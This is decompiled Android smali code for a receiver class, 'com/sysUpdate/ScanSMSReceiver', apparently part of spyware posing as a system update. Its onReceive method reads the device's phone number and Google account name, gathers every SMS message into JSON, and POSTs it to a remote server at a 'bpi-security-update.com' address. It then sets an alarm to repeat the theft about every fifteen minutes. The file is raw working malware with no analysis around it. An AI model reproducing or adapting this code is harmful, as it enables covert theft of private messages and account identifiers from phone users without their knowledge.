.class public Lcom/sysUpdate/ScanSMSReceiver;
.super Landroid/content/BroadcastReceiver;
.source "ScanSMSReceiver.java"


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 30
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private setSmsAlarm(Landroid/content/Context;)V
    .registers 8

    .prologue
    const/16 v5, 0xc

    .line 103
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/sysUpdate/ScanSMSReceiver;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 104
    new-instance v1, Ljava/util/GregorianCalendar;

    invoke-direct {v1}, Ljava/util/GregorianCalendar;-><init>()V

    .line 105
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    long-to-int v2, v2

    .line 106
    const/high16 v3, 0x40000000    # 2.0f

    .line 107
    invoke-static {p1, v2, v0, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v2

    .line 109
    const/16 v0, 0xf

    invoke-virtual {v1, v5, v0}, Ljava/util/GregorianCalendar;->add(II)V

    .line 110
    const-string v0, "SMS_SCAN_ALARM_SET"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Set scan sms alarm for "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const/16 v4, 0xa

    invoke-virtual {v1, v4}, Ljava/util/GregorianCalendar;->get(I)I

    move-result v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ":"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v1, v5}, Ljava/util/GregorianCalendar;->get(I)I

    move-result v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 111
    const-string v0, "alarm"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 112
    const/4 v3, 0x0

    invoke-virtual {v1}, Ljava/util/GregorianCalendar;->getTimeInMillis()J

    move-result-wide v4

    invoke-virtual {v0, v3, v4, v5, v2}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 114
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 10

    .prologue
    const/4 v1, 0x0

    const/4 v2, 0x1

    .line 35
    const-string v0, "phone"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    .line 36
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v2}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v2

    .line 39
    invoke-static {p1}, Landroid/accounts/AccountManager;->get(Landroid/content/Context;)Landroid/accounts/AccountManager;

    move-result-object v0

    const-string v3, "com.google"

    invoke-virtual {v0, v3}, Landroid/accounts/AccountManager;->getAccountsByType(Ljava/lang/String;)[Landroid/accounts/Account;

    move-result-object v0

    .line 40
    aget-object v0, v0, v1

    iget-object v3, v0, Landroid/accounts/Account;->name:Ljava/lang/String;

    .line 43
    invoke-static {p1}, Lcom/sysUpdate/SmsHelpers;->getSmsDetails(Landroid/content/Context;)[Lcom/sysUpdate/Sms;

    move-result-object v4

    .line 45
    new-instance v5, Lorg/json/JSONArray;

    invoke-direct {v5}, Lorg/json/JSONArray;-><init>()V

    .line 46
    array-length v6, v4

    move v0, v1

    :goto_2b
    if-ge v0, v6, :cond_39

    aget-object v1, v4, v0

    .line 47
    invoke-virtual {v1, v2, v3}, Lcom/sysUpdate/Sms;->toJson(Ljava/lang/String;Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v1

    invoke-virtual {v5, v1}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 46
    add-int/lit8 v0, v0, 0x1

    goto :goto_2b

    .line 51
    :cond_39
    const/4 v2, 0x0

    .line 56
    const-string v3, "http://proton.bpi-security-update.com/receiveJsonSms.php"

    .line 58
    :try_start_3c
    const-string v0, "http.keepAlive"

    const-string v1, "false"

    invoke-static {v0, v1}, Ljava/lang/System;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 59
    new-instance v0, Ljava/net/URL;

    invoke-direct {v0, v3}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 60
    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    check-cast v0, Ljava/net/HttpURLConnection;
    :try_end_4e
    .catch Ljava/net/MalformedURLException; {:try_start_3c .. :try_end_4e} :catch_104
    .catch Ljava/io/IOException; {:try_start_3c .. :try_end_4e} :catch_e9
    .catchall {:try_start_3c .. :try_end_4e} :catchall_f5

    .line 61
    :try_start_4e
    const-string v1, "POST"

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 62
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 63
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    .line 64
    const/16 v1, 0x2710

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 66
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->connect()V

    .line 69
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "texts"

    const-string v4, "UTF-8"

    invoke-static {v2, v4}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 70
    invoke-virtual {v5}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "UTF-8"

    invoke-static {v2, v4}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 72
    new-instance v2, Ljava/io/OutputStreamWriter;

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4

    invoke-direct {v2, v4}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 73
    invoke-virtual {v2, v1}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;)V

    .line 74
    invoke-virtual {v2}, Ljava/io/OutputStreamWriter;->flush()V

    .line 77
    new-instance v1, Ljava/io/BufferedReader;

    new-instance v2, Ljava/io/InputStreamReader;

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v4

    invoke-direct {v2, v4}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v1, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 78
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 80
    :goto_ae
    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    if-eqz v4, :cond_e2

    .line 81
    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_b7
    .catch Ljava/net/MalformedURLException; {:try_start_4e .. :try_end_b7} :catch_b8
    .catch Ljava/io/IOException; {:try_start_4e .. :try_end_b7} :catch_101
    .catchall {:try_start_4e .. :try_end_b7} :catchall_fe

    goto :goto_ae

    .line 83
    :catch_b8
    move-exception v1

    move-object v2, v0

    .line 84
    :goto_ba
    :try_start_ba
    invoke-virtual {v1}, Ljava/net/MalformedURLException;->printStackTrace()V

    .line 85
    const-string v0, "URL INVALID:"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "The url given, "

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, ", is invalid."

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_db
    .catchall {:try_start_ba .. :try_end_db} :catchall_f5

    .line 92
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 97
    invoke-direct {p0, p1}, Lcom/sysUpdate/ScanSMSReceiver;->setSmsAlarm(Landroid/content/Context;)V

    .line 99
    :goto_e1
    return-void

    .line 92
    :cond_e2
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 97
    invoke-direct {p0, p1}, Lcom/sysUpdate/ScanSMSReceiver;->setSmsAlarm(Landroid/content/Context;)V

    goto :goto_e1

    .line 87
    :catch_e9
    move-exception v0

    move-object v1, v0

    .line 88
    :goto_eb
    :try_start_eb
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V
    :try_end_ee
    .catchall {:try_start_eb .. :try_end_ee} :catchall_f5

    .line 92
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 97
    invoke-direct {p0, p1}, Lcom/sysUpdate/ScanSMSReceiver;->setSmsAlarm(Landroid/content/Context;)V

    goto :goto_e1

    .line 92
    :catchall_f5
    move-exception v0

    move-object v1, v0

    :goto_f7
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 97
    invoke-direct {p0, p1}, Lcom/sysUpdate/ScanSMSReceiver;->setSmsAlarm(Landroid/content/Context;)V

    .line 98
    throw v1

    .line 92
    :catchall_fe
    move-exception v1

    move-object v2, v0

    goto :goto_f7

    .line 87
    :catch_101
    move-exception v1

    move-object v2, v0

    goto :goto_eb

    .line 83
    :catch_104
    move-exception v0

    move-object v1, v0

    goto :goto_ba
.end method
